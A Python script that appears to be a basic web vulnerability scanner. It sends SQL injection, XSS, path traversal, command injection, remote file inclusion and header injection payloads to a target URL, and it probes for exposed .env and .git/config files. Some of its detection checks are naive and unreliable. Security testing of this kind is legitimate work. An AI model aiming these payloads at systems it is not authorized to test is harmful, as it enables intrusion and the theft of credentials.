import http.client
from urllib.parse import urlparse, urlencode, urljoin

def http_request(url, method="GET", data=None):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)

    if method == "GET":
        conn.request("GET", parsed_url.path + "?" + urlencode(data) if data else parsed_url.path)
    elif method == "POST":
        headers = {"Content-type": "application/x-www-form-urlencoded"}
        conn.request("POST", parsed_url.path, urlencode(data), headers)

    response = conn.getresponse()
    return response.read().decode(), response.status

def check_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' /* "]
    vulnerable = False
    for payload in sql_payloads:
        data = {"input": payload}
        response, status = http_request(url, method="GET", data=data)
        if "error" not in response.lower() and "warning" not in response.lower():
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No SQL Injection vulnerability found with payload: {payload}")
    return vulnerable

def check_xss(url):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<body onload=alert('XSS')>"]
    vulnerable = False
    for payload in xss_payloads:
        data = {"input": payload}
        response, status = http_request(url, method="GET", data=data)
        if payload in response:
            print(f"Potential XSS vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No XSS vulnerability found with payload: {payload}")
    return vulnerable

def check_open_redirect(url):
    open_redirect_payloads = ["/example.com", "https://example.com"]
    vulnerable = False
    for payload in open_redirect_payloads:
        data = {"url": payload}
        response, status = http_request(url, method="GET", data=data)
        if payload in response:
            print(f"Potential Open Redirect vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No Open Redirect vulnerability found with payload: {payload}")
    return vulnerable

def check_csrf(url):
    response, status = http_request(url)
    if status != 200:
        print(f"Failed to retrieve page content for CSRF check. Status code: {status}")
        return False

    anti_csrf_tokens = ["csrf", "token", "authenticity_token", "nonce"]
    if any(token in response.lower() for token in anti_csrf_tokens):
        print("Anti-CSRF tokens found in the page, likely protected.")
        return False
    else:
        print("No anti-CSRF tokens found, potential CSRF vulnerability.")
        return True

def check_directory_traversal(url):
    traversal_payloads = ["../../../../etc/passwd", "../etc/passwd"]
    vulnerable = False
    for payload in traversal_payloads:
        data = {"file": payload}
        response, status = http_request(url, method="GET", data=data)
        if "root:x:0:0:" in response:
            print(f"Potential Directory Traversal vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No Directory Traversal vulnerability found with payload: {payload}")
    return vulnerable

def check_command_injection(url):
    command_payloads = ["; ls", "&& ls"]
    vulnerable = False
    for payload in command_payloads:
        data = {"input": payload}
        response, status = http_request(url, method="GET", data=data)
        if "bin" in response or "etc" in response:
            print(f"Potential Command Injection vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No Command Injection vulnerability found with payload: {payload}")
    return vulnerable

def check_lfi(url):
    lfi_payloads = ["../../../../etc/passwd", "../../../../../../windows/win.ini"]
    vulnerable = False
    for payload in lfi_payloads:
        data = {"file": payload}
        response, status = http_request(url, method="GET", data=data)
        if "root:x:0:0:" in response or "[extensions]" in response:
            print(f"Potential Local File Inclusion (LFI) vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No LFI vulnerability found with payload: {payload}")
    return vulnerable

def check_rfi(url):
    rfi_payloads = ["http://example.com/shell.txt"]
    vulnerable = False
    for payload in rfi_payloads:
        data = {"file": payload}
        response, status = http_request(url, method="GET", data=data)
        if "shell" in response:
            print(f"Potential Remote File Inclusion (RFI) vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No RFI vulnerability found with payload: {payload}")
    return vulnerable

def check_http_header_injection(url):
    header_injection_payloads = ["\r\nSet-Cookie: injected=1", "%0d%0aSet-Cookie: injected=1"]
    vulnerable = False
    for payload in header_injection_payloads:
        headers = {"User-Agent": f"test{payload}"}
        parsed_url = urlparse(url)
        conn = http.client.HTTPConnection(parsed_url.netloc)
        conn.request("GET", parsed_url.path, headers=headers)
        response = conn.getresponse()
        headers_dict = {k.lower(): v.lower() for k, v in response.getheaders()}
        if "set-cookie" in headers_dict and "injected=1" in headers_dict["set-cookie"]:
            print(f"Potential HTTP Header Injection vulnerability found with payload: {payload}")
            vulnerable = True
        else:
            print(f"No HTTP Header Injection vulnerability found with payload: {payload}")
    return vulnerable

def check_sensitive_data_exposure(url):
    sensitive_files = [".env", "config.php", ".git/config", "web.config"]
    vulnerable = False
    for file in sensitive_files:
        file_url = urljoin(url, file)
        response, status = http_request(file_url, method="GET")
        if status == 200 and ("DB_PASSWORD" in response or "database" in response):
            print(f"Sensitive data exposure found: {file}")
            vulnerable = True
        else:
            print(f"No sensitive data exposure found for: {file}")
    return vulnerable

def main():
    url = input("Enter the URL to scan (e.g., http://example.com/page): ")
    print("Checking for SQL Injection vulnerabilities...")
    check_sql_injection(url)
    print("Checking for XSS vulnerabilities...")
    check_xss(url)
    print("Checking for Open Redirect vulnerabilities...")
    check_open_redirect(url)
    print("Checking for CSRF vulnerabilities...")
    check_csrf(url)
    print("Checking for Directory Traversal vulnerabilities...")
    check_directory_traversal(url)
    print("Checking for Command Injection vulnerabilities...")
    check_command_injection(url)
    print("Checking for Local File Inclusion (LFI) vulnerabilities...")
    check_lfi(url)
    print("Checking for Remote File Inclusion (RFI) vulnerabilities...")
    check_rfi(url)
    print("Checking for HTTP Header Injection vulnerabilities...")
    check_http_header_injection(url)
    print("Checking for Sensitive Data Exposure vulnerabilities...")
    check_sensitive_data_exposure(url)

if __name__ == "__main__":
    main()
